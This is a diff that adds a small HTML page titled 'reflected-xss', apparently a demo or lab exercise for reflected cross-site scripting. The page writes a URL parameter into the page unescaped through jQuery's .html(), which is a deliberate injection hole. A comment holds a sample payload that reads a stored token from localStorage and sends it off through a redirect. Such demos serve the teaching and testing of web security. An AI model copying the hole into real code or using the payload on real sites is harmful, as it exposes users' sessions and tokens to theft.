@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="javascripts/jquery-3.6.0.js"></script>
+    <meta charset="UTF-8">
+    <title>reflected-xss</title>
+</head>
+<script>
+    localStorage.setItem("token","this is token")
+    $(document).ready(function (){
+        let search = window.location.search.substring(1)
+        let urlsp = new URLSearchParams(search)
+        $("#welcome").html(urlsp.get("welcome"))
+        $("#name").change(function (){
+            $.ajax('/users/info?name='+$("#name").val()).done(function (data){
+                window.location.href = "/index.html?welcome=" + data
+            })
+            // welcome.html("Hello, " + $("#name").val())
+            //<script>window.onload=function(){var a=localStorage.getItem('token');window.location.href=`/xss?token=${a}`;}
+        })
+    })
+
+</script>
+<body>
+<div>
+    <p>姓名：</p>
+    <input id="name">
+    <p id="welcome"></p>
+</div>
+
+</body>
+</html>
